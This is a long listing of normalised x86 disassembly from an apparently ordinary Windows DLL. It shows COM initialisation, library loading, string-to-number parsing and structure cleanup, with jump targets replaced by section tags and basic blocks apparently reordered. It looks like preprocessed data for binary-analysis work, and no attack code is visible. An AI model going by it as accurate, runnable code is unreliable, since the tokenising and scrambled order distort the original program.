mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10009820
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov edx [ eax + 0x30 ]
push ebx
push edi
lea ecx [ ebp - 0x44 ]
push ecx
xor edi edi
push esi
xor ebx ebx
mov [ ebp - 0x44 ] edi
call edx
test eax eax
jns r-xdata
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x40 ]
mov [ ebp - 0x40 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
mov eax [ ebp - 0x40 ]
cmp eax edi
jne r-xdata
lea eax [ edi + 0x2 ]
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ esi ]
lea edx [ ebp - 0x48 ]
push edx
push eax
mov eax [ ecx + 0x50 ]
push esi
mov [ ebp - 0x48 ] edi
call eax
mov eax [ ebp - 0x48 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x2f
call sub_1000a6f0
pop edi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ebx 0x4
xor eax eax
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x48 ] edi
jmp r-xdata
inc eax
cmp eax 0x18
jb r-xdata
mov eax [ ebp - 0x40 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x40 ]
mov [ ebp - 0x40 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
mov eax [ ebp - 0x40 ]
cmp eax edi
jne r-xdata
mov eax [ ebp - 0x44 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
mov eax ebx
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10009909
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x50
push 0x1
call sub_10025450
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x18 ] edi
jne r-xdata
mov esi [ esi + 0xbc ]
push 0x14
pop ecx
mov edi ebx
push 0x4
[ edi ] [ esi ]
call sub_10028397
xor edi edi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov [ eax ] edi
cmp [ esi + 0x1c ] edi
je r-xdata
push ebx
call sub_10020a90
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb4 ]
mov edi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ ebx ] eax
mov eax [ rw-data ]
mov [ ebx + 0x4 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x8 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x30 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] edi
mov [ ebx + 0x34 ] eax
push 0x4
call sub_10028397
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
push eax
call edi
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x3e ]
push ebx
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002f2f7
mov edi eax
lea eax [ ebx + 0x4 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ ebx + 0x8 ]
push eax
push 0x10
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ ebx + 0x30 ]
push eax
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ ebx + 0x34 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1002f2f7
add esp 0x14
or eax edi
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push ebx
call sub_100187b7
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ esi + 0xb0 ]
call sub_10020a90
push [ esi + 0xbc ]
call sub_10020a90
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push ebx
call sub_10020a90
push [ ebp - 0x8 ]
call sub_10020a90
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ecx ] eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_10009b00
push 0x0
push 0x0
call [ CoInitializeEx@IAT ]
mov [ esi ] eax
test eax eax
js r-xdata
mov eax [ esi ]
retn
lea eax [ esi + 0x4 ]
push eax
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
mov [ esi ] eax
test eax eax
jns r-xdata
call [ CoUninitialize@IAT ]
sub_10009b37
mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
ja r-xdata
mov eax [ ebp + 0x14 ]
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006a3e7
dec [ ebp + 0x18 ]
inc [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_10009b69
mov edi edi
push ebp
mov ebp esp
push 0x8
call sub_1005ac7e
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ rw-data ] eax
pop ebp
retn
sub_10009b93
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
mov eax r--data
mov ecx [ ebp + 0xc ]
cmp ecx 0x2
ja r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x1
ja r-xdata
cmp [ ebp + 0x14 ] 0x4
ja r-xdata
lea eax [ eax + ecx * 2 ]
imul eax eax 0x5
add eax [ ebp + 0x14 ]
lea eax [ eax * 4 + r--data ]
jmp r-xdata
push 0x4
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_100591ce
add esp 0x10
pop ebp
retn 0x10
sub_10009bdf
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x0
push eax
push [ ebp - 0x8c ]
call sub_10017366
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1002868d
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_1004a342
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x1c
fld [ r--data ]
fmul st1
fld st1
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ ebp - 0x88 ]
fld [ ebp + 0x1c ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
mov [ ebp - 0x79 ] 0x0
fxch st1
fxch st1
mov [ ebp - 0x79 ] 0x1
fchs
jmp r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
fchs
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_10009dbc
push 0x10
mov eax sub_1007e5e8
call sub_10050d0f
mov edi ecx
mov ecx [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
call sub_1004737b
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
call sub_1002a730
mov esi [ ebp + 0x28 ]
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x25
jne r-xdata
mov esi [ ebp + 0x20 ]
cmp al 0x20
jne r-xdata
push 0x0
mov eax [ edi ]
inc esi
movzx ecx [ esi ]
push ecx
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x1c ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x1c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1001a1b3
retn 0x24
or [ esi ] 0x1
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
jne r-xdata
inc esi
movzx ebx [ ebp + 0x12 ]
lea eax [ edi + 0x14 ]
push eax
movzx eax [ esi ]
push 0x0
push eax
call sub_1005e05a
add esp 0xc
cmp bx ax
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
mov ebx [ ebp - 0x14 ]
mov esi [ ebp + 0x20 ]
or [ esi ] 0x2
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1ec
push [ ebp + 0x12 ]
mov eax [ ebx ]
push 0x48
mov ecx ebx
call [ eax + 0x8 ]
test al al
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1ec
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
sub_10009ef2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10020a90
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_10020a90
pop ecx
push esi
call sub_10020a90
pop ecx
sub_1000a00e
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10016cbe
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0xffffffe0
pop ebp
retn
sub_1000a03a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10079bd3
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1000a080
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_1000a0b0
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
call [ GetCurrentThreadId@IAT ]
cmp [ esi + 0x374 ] eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0xdb
call sub_1001bb80
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push 0x1503
push sub_1000de40
push sub_1001a1b0
push sub_100165d0
push 0x0
push edi
push r--data
push eax
mov eax [ esi + 0x38c ]
mov [ esi + 0x40 ] 0x1
call eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0x20
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1000a135
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_1004ba5c
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x80000000
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
mov ecx eax
or ecx edx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_10036d11
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_10012991
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp edx esi
jb r-xdata
jb r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
mov [ eax ] 0x1
neg eax
adc edx 0x0
neg edx
ja r-xdata
cmp eax 0xffffffff
ja r-xdata
or eax 0xffffffff
mov edx 0x7fffffff
jmp r-xdata
xor eax eax
mov edx esi
jmp r-xdata
test eax eax
je r-xdata
sub_1000a200
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
push eax
lea esi [ edi + 0x8 ]
push esi
lea ecx [ ebp + 0x8 ]
mov [ edi + 0x4 ] eax
call sub_1002e530
push eax
mov ecx esi
call sub_1002d160
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
mov [ edi + 0x4c ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100067d1
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov esi [ ebx + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi ebx
call sub_1002470e
xor ebx ebx
cmp esi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov [ edi + 0x4c ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ ebx + 0x4 ] eax
sub_1000a284
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1000a310
push ebp
mov ebp esp
sub esp 0x8
mov edx [ ebp + 0x8 ]
push ebx
push edi
mov edi [ edx + 0x4 ]
mov eax [ edi + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov cl 0x1
mov [ ebp - 0x8 ] cl
jne r-xdata
mov ebx edi
mov [ ebp - 0x4 ] ebx
test cl cl
je r-xdata
mov ecx [ ebp + 0xc ]
mov ebx [ ecx + 0xc ]
mov eax [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push eax
cmp ecx [ eax + 0xc ]
jae r-xdata
mov eax [ edx + 0x4 ]
cmp edi [ eax ]
jne r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
call sub_10065045
add esp 0x4
pop edi
mov [ esi ] ebx
mov [ esi + 0x4 ] 0x0
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
push ecx
mov ecx edi
mov ebx edx
call sub_10054460
mov edx [ eax ]
pop edi
mov [ esi ] edx
mov [ esi + 0x4 ] 0x1
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x4 ]
call sub_1002b900
mov ebx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push ecx
push 0x1
lea eax [ ebp + 0xc ]
push eax
mov ecx edi
mov ebx edx
call sub_10054460
mov ecx [ eax ]
pop edi
mov [ esi ] ecx
mov [ esi + 0x4 ] 0x1
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp ebx [ eax + 0xc ]
mov edi eax
setb cl
mov [ ebp - 0x8 ] cl
test cl cl
je r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_1000a3e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fa88
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0xb8 ] bl
je r-xdata
mov eax [ esi + 0xbc ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
mov ecx esi
call sub_1005d8e0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0xbc ] ebx
mov eax [ esi + 0xc4 ]
cmp eax ebx
je r-xdata
push eax
mov eax [ esi + 0xd8 ]
call eax
mov [ esi + 0xc0 ] ebx
mov ecx [ esi + 0xd8 ]
push eax
call ecx
mov [ esi + 0xc4 ] ebx
sub_1000a47d
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x18 ]
lea ecx [ ebp + 0x10 ]
call sub_1006a3e7
dec [ ebp + 0x1c ]
jne r-xdata
sub_1000a500
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
push edi
call sub_1003fdd0
push edi
call sub_1002afa0
push edi
call sub_100081a0
mov esi [ ebp + 0x18 ]
add esp 0xc
mov [ esi ] 0xffffffff
mov [ esi + 0x4 ] 0xffffffff
push edi
cmp eax [ ebp + 0x10 ]
jne r-xdata
call sub_100081a0
inc eax
add esp 0x4
cmp eax 0x3d
ja r-xdata
call sub_1000e3b0
add esp 0x4
pop edi
mov [ esi ] 0xffffffff
mov eax 0x1
pop esi
pop ebp
retn
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
push edx
push eax
call sub_10077c30
add esp 0xc
pop edi
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1000a5b0 ]
jmp [ eax * 4 + jump_table_1000a5a4 ]
push edi
call sub_1000e3b0
add esp 0x4
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push ecx
mov ebx edi
call sub_10077910
add esp 0x8
pop ebx
pop edi
pop esi
pop ebp
retn
sub_1000a5ee
push 0x8
push r--data
call sub_10078b50
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_1003938d
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000a690
push 0xc
call sub_1003938d
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_1004a2b3
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000a699
call sub_10078b95
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_1000a6a2
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x8 ]
add edi 0x8
movzx eax [ esi ]
push edi
push 0x0
push eax
call sub_1005e05a
movzx eax ax
add esp 0xc
push eax
lea ecx [ ebp + 0x10 ]
call sub_1002836c
dec [ ebp + 0x1c ]
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop edi
pop esi
sub_1000a6f0
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_1000a731
push 0x38
mov eax sub_1007e8a6
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10009450
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10042119
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10045daa
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_1002a730
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_1000a7df
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
xor eax eax
mov eax [ eax * 8 + rw-data ]
jmp r-xdata
inc eax
cmp eax 0x1d
jl r-xdata
mov [ ebp - 0x1c ] eax
